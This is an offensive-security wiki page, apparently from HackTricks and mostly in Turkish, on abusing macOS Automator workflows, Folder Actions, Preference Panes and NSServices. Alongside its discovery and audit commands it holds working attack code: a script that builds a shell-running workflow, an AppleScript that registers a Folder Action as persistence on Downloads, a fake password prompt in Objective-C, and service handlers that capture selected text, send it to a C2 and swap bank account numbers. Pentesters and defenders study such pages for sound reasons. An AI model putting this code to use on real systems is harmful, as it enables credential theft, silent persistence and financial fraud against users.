# macOS Automator, Preference Panes & NSServices Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Automator Actions & Workflows

### Temel Bilgiler

**Automator**, macOS'un görsel otomasyon aracıdır. **Actions** (`.action` bundle'ları) tarafından oluşturulan **workflows** (`.workflow` bundle'ları) çalıştırır. Automator ayrıca **Folder Actions**, **Quick Actions** ve **Shortcuts** entegrasyonuna da güç verir. Modern macOS'ta workflow'lar **Shortcuts'a aktarılabilir**; bu nedenle aynı kötü amaçlı mantık, Finder Quick Action'ı, `~/Library/Services/` altındaki bir user service veya eski Automator actions tarafından desteklenen bir shortcut olarak görünebilir.

Automator actions, bir workflow çalıştırıldığında Automator runtime tarafından yüklenen **plugin**'lerdir. Şunları yapabilirler:
- Herhangi bir shell script çalıştırmak
- Dosyaları ve verileri işlemek
- AppleScript aracılığıyla uygulamalarla etkileşim kurmak
- Karmaşık otomasyonlar için birbirlerine zincirlenmek

### Bunun Önemi

> [!WARNING]
> Automator workflow'ları çalıştırılmaları için **social engineering** ile kullanılabilir; basit document dosyaları gibi görünürler. Bir `.workflow` bundle'ı, workflow çalıştığında yürütülen gömülü shell command'leri içerebilir. Folder Actions ile birleştirildiklerinde, dosya olaylarıyla tetiklenen **automatic persistence** sağlarlar. Güncel Gatekeeper düzeltmeleri ayrıca **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) içeriklerinin zararsız veri olarak değil, çalıştırılabilir içerik olarak ele alınması gerektiğini göstermiştir.

### Discovery
```bash
# Find Automator actions installed on the system
find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null

# Find user-created workflows / Quick Actions
find ~/Library/Services -name "*.workflow" 2>/dev/null
find ~/Library/Workflows -name "*.workflow" 2>/dev/null
find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null

# Inspect the embedded workflow definition
plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null

# List active Folder Actions
defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'automator_action';"
```
### Saldırı: Social-Engineered Workflow

Bir `.workflow` bundle'ı çoğu kullanıcıya normal bir belge dosyası gibi görünür:
```bash
# Create a workflow programmatically
mkdir -p /tmp/Evil.workflow/Contents
cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>AMApplicationBuild</key>
<string>523</string>
<key>AMApplicationVersion</key>
<string>2.10</string>
<key>actions</key>
<array>
<dict>
<key>action</key>
<dict>
<key>AMActionVersion</key>
<string>2.0.3</string>
<key>AMApplication</key>
<array>
<string>Automator</string>
</array>
<key>AMBundleID</key>
<string>com.apple.RunShellScript</string>
</dict>
</dict>
</array>
</dict>
</plist>
PLIST
```
### Saldırı: Folder Action Persistence

Folder Actions, monitored bir klasöre dosyalar eklendiğinde bir workflow'u otomatik olarak çalıştırır:
```bash
# Register a Folder Action on ~/Downloads
# Every file the user downloads triggers the workflow

# Method 1: Via AppleScript
osascript -e '
tell application "System Events"
make new folder action at end of folder actions with properties {name:"Downloads", path:(path to downloads folder)}
tell folder action "Downloads"
make new script at end of scripts with properties {name:"Evil", path:"/path/to/evil.workflow"}
end tell
set folder actions enabled to true
end tell'

# Method 2: Via the Folder Actions Setup utility
# Users can be tricked into installing a Folder Action through a .workflow double-click
```
> [!CAUTION]
> Folder Actions yeniden başlatmalar boyunca kalıcı olur ve sessizce çalışır. `~/Downloads` üzerinde bir Folder Action bulunması, Safari, Chrome, AirDrop ve e-posta ekleri dahil **indirilen her dosyanın payload'unuzu tetiklemesi** anlamına gelir. Ayrıca `System Events`, varsayılan `~/Library/Scripts/Folder Action Scripts` konumlarının dışındaki script'leri gösteren Folder Actions kaydedebilir; bu da serbest yol aramasını değerli kılar. İlgili TCC etkileri için [TCC sayfasına](../macos-security-protections/macos-tcc/README.md) bakın.

---

## Preference Panes

### Temel Bilgiler

Preference panes (`.prefPane` bundles), **System Settings** (eski adıyla System Preferences) tarafından yüklenen plugin'lerdir. Sistem veya üçüncü taraf özellikleri için yapılandırma arayüzü panelleri sağlarlar. Eski sistemlerde doğrudan `System Preferences` tarafından yüklenirken, daha yeni sürümlerde üçüncü taraf paneller genellikle System Settings'ten başlatılan bir **legacy loader XPC service** tarafından aracılık edilerek yüklenir.

### Bunun Önemi

- Preference panes, System Settings / System Preferences tarafından başlatılan **güvenilir bir host process** içinde çalışır
- Modern sistemlerde bu host, bir **`legacyLoader` XPC service** olabilir; dolayısıyla önemli sınır hâlâ **güvenilir Apple UI process -> üçüncü taraf code loading** şeklindedir
- Üçüncü taraf preference panes, **host process security context**'ini ve bu UI'ya bağlı kullanıcı güvenini devralır
- Kullanıcılar preference panes'leri **çift tıklayarak** yükler; bu, sosyal mühendislik için kolay bir yöntemdir
- Yüklendikten sonra **kalıcı olurlar** ve System Settings her açıldığında ilgili panele yüklenirler

### Keşif
```bash
# Find installed preference panes
ls /Library/PreferencePanes/ 2>/dev/null
ls ~/Library/PreferencePanes/ 2>/dev/null
ls /System/Library/PreferencePanes/

# Check for non-Apple preference panes (third-party)
find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null

# Look for the modern host process used to load legacy panes
ps aux | egrep 'System Settings|System Preferences|legacyLoader'
log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'preference_pane';"
```
### Attack: Privilege Context Hijacking

Kötü amaçlı bir preference pane, **pane host'unun** güvenlik bağlamını devralır (geçmişte `System Preferences`, daha yeni sürümlerde ise genellikle `System Settings` tarafından başlatılan bir `legacyLoader` helper):
```objc
// Preference pane principal class
@interface MaliciousPrefPane : NSPreferencePane
@end

@implementation MaliciousPrefPane
- (void)mainViewDidLoad {
[super mainViewDidLoad];
// This code runs inside the preference-pane host process
// It inherits that host's permissions / trust relationship

// Example: read files accessible to System Settings
NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];

// Example: use Accessibility API if System Settings has it
AXUIElementRef systemWide = AXUIElementCreateSystemWide();
// ... control other applications
}
@end
```
### Saldırı: Kurulum Yoluyla Kalıcılık
```bash
# Install a preference pane (user-level, no admin required)
cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/

# System-level (requires admin)
sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/

# The pane loads every time the user opens System Settings and navigates to it
# For better persistence, set it as the default pane
```
### Attack: UI Phishing

Bir preference pane, **kimlik bilgilerini ele geçirmek** için meşru sistem UI panellerini taklit edebilir:
```objc
// Display a fake authentication dialog
NSAlert *alert = [[NSAlert alloc] init];
alert.messageText = @"System Settings needs your password to make changes.";
alert.informativeText = @"Enter your password to allow this.";
[alert addButtonWithTitle:@"OK"];
[alert addButtonWithTitle:@"Cancel"];

NSSecureTextField *passwordField = [[NSSecureTextField alloc] initWithFrame:NSMakeRect(0, 0, 200, 24)];
alert.accessoryView = passwordField;
[alert runModal];

NSString *password = passwordField.stringValue;
// Exfiltrate password...
```
---

## NSServices

### Temel Bilgiler

**NSServices**, uygulamaların **Services menüsü** (sağ tıklama → Services) üzerinden diğer uygulamalara işlevsellik sunmasına olanak tanır. Kullanıcı metin veya veri seçip bir service çağırdığında, seçilen veri işlenmek üzere **service provider'a gönderilir**.

Services, bir uygulamanın `Info.plist` dosyasında `NSServices` anahtarı altında tanımlanır ve pasteboard server (`pbs`) ile kaydedilir. macOS ayrıca hangi services'lerin görünür olacağını ve sandbox'lı çağıranların ek bir uyarı alıp almayacağını belirleyen bir **service cache** ve bir **restriction policy** tutar.

### Bunun Önemi

- Services, **uygulamalar arası veri akışı** alır — herhangi bir uygulamadaki seçili metin service'e gönderilir
- Kötü amaçlı bir service, password manager'lar, email client'ları ve finans uygulamalarındaki verileri yakalayabilir
- Services, çağıran uygulamaya **değiştirilmiş veri döndürebilir** (selection işlemleri üzerinde man-in-the-middle)
- Service adları meşru görünecek şekilde hazırlanabilir ("Format Text", "Encrypt Selection", "Share")
- İsteğe bağlı `NSRestricted` flag'i güvenlik açısından önemlidir: unrestricted olarak işaretlenmiş bir service, sandbox'lı bir uygulama tarafından macOS'un escape riski taşıyan services için gösterdiği uyarı olmadan çağrılabilir<sup>[[2]](#references)</sup>

### Keşif
```bash
# List all registered services
/System/Library/CoreServices/pbs -dump_pboard 2>/dev/null

# Find apps providing services
find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/null

# Check specific app's services
defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null

# Inspect the service cache and the built-in restriction policy
plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null

# Hunt for services explicitly marked as restricted / unrestricted
find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT e.path, h.handler_metadata
FROM executables e
JOIN executable_handlers eh ON e.id = eh.executable_id
JOIN handlers h ON eh.handler_id = h.id
WHERE h.handler_type = 'service';"
```
### Attack: Data Interception Service
```xml
<!-- Info.plist NSServices declaration -->
<key>NSServices</key>
<array>
<dict>
<key>NSMessage</key>
<string>processSelection</string>
<key>NSPortName</key>
<string>EvilService</string>
<key>NSSendTypes</key>
<array>
<string>NSStringPboardType</string>
</array>
<key>NSMenuItem</key>
<dict>
<key>default</key>
<string>Format Selected Text</string>
</dict>
</dict>
</array>
```

```objc
// Service handler — receives user-selected text from any application
- (void)processSelection:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];

// selectedText contains whatever the user selected in any app
// Could be a password, credit card number, private message, etc.

// Exfiltrate the captured data
[self sendToC2:selectedText];

// Optionally return the text unchanged so user doesn't notice
[pboard clearContents];
[pboard setString:selectedText forType:NSPasteboardTypeString];
}
```
### Saldırı: Veri Değiştirme (Man-in-the-Middle)

Bir service, meşru bir işlev sağlıyor gibi görünürken **döndürülen verileri değiştirebilir**:
```objc
// A "Secure Encrypt" service that actually intercepts and modifies data
- (void)secureEncrypt:(NSPasteboard *)pboard
userData:(NSString *)userData
error:(NSString **)error {
NSString *original = [pboard stringForType:NSPasteboardTypeString];

// Log the original data (credential capture)
[self exfiltrate:original];

// Return modified data (e.g., replace bank account in a wire transfer)
NSString *modified = [original stringByReplacingOccurrencesOfString:@"original-account"
withString:@"attacker-account"];
[pboard clearContents];
[pboard setString:modified forType:NSPasteboardTypeString];
}
```
### Kısıtlı Services ve Modern Abuse

Apple, her service definition için isteğe bağlı bir `NSRestricted` boolean değerini destekler. Bu değer ayarlanmışsa macOS, service sandboxed callers tarafından kullanıldığında uyarı verir; çünkü service, çağıranların **sandbox veya privacy sınırlarından escape etmesine** yardımcı olabilir. Offensive açıdan bu, iki yararlı audit yolu sunar:

- Apple Events, file access veya diğer privileged actions işlemlerini proxy'leyen ancak restricted olarak işaretlenmemiş **third-party services** arayın
- Güçlü entitlements değerlerine sahip **yüksek değerli built-in services** arayın (örneğin Script Editor tarafından sunulan veya Finder-backed helpers) ve user interaction'ın bunları bir data-access primitive'e dönüştürmeye yetip yetmediğini kontrol edin

Yakın tarihli iyi bir örnek, Services mekanizmasının **beklenen confirmation flow olmadan TCC-protected user files** dosyalarına erişmek için abuse edilebildiği **CVE-2022-48574**'tür. Bug düzeltilmiş olsa da technique threat modeling için hâlâ kullanışlıdır: caller adına file access veya automation requests ileten her service aynı incelemeye tabi tutulmalıdır.<sup>[[2]](#references)</sup>

---

## Recent Security Notes

- **Quick Actions executable content'tir**: Apple, 2024'te app-bundled Automator Quick Action'ın normal assessment olmadan çalışmasına izin veren bir Gatekeeper bypass'ını düzeltti. Apps audit edilirken `Contents/PlugIns/*.workflow/Contents/document.wflow` dosyasını, helper scripts veya login items inceler gibi inceleyin. Bkz. [the Gatekeeper page](../macos-security-protections/macos-gatekeeper.md).<sup>[[1]](#references)</sup>
- **Shortcuts legacy Automator behavior'ı devralabilir**: Apple ayrıca, third-party shortcuts'ın beklenen permission flow olmadan Apple Events göndermek için bir **legacy Automator action** kullandığı tespit edildikten sonra ek bir user-consent prompt'u ekledi. Imported workflows ve shortcut bundles, `Run AppleScript`, `Run Shell Script` ve benzer bridge actions açısından incelenmelidir. Bkz. [the TCC page](../macos-security-protections/macos-tcc/README.md).
- **Automator hâlâ aktif bir privacy boundary'dir**: Apple, protected user data'ya erişim için 2025'te başka bir Automator fix'i yayınladı. Automator legacy bir surface olsa bile workflow runner, Quick Action host veya automation bridge gibi bileşenleri dead code yerine current attack surface olarak değerlendirin.

---

## Cross-Technique Attack Chains

### Automator Folder Action → Credential Harvesting
```
1. Install Folder Action on ~/Downloads
2. Workflow scans every downloaded file for credentials/keys
3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
4. Exfiltrate findings
```
### Preference Pane → TCC Escalation
```
1. Distribute malicious prefPane (social engineering)
2. User double-clicks → installed in ~/Library/PreferencePanes/
3. PrefPane is loaded by the System Settings / legacyLoader host
4. Inherits the host process trust and any useful entitlements / TCC posture
5. Access protected data, control other apps, or phish from a trusted Apple UI
```
### NSService → Password Manager Hırsızlığı
```
1. Register a service named "Secure Copy"
2. User selects password in password manager
3. User right-clicks → Services → "Secure Copy"
4. Service receives the password text
5. Exfiltrate while placing it on clipboard normally
```
## Referanslar

- [1] [Apple — macOS Ventura 13.7, Sonoma 14.7 ve Sequoia 15'in güvenlik içeriği hakkında](https://support.apple.com/en-us/121238)
- [2] [Moonlock — NSServices exploit'inin macOS'ta nasıl çalıştığı](https://moonlock.com/nsservices-macos)

{{#include ../../../banners/hacktricks-training.md}}
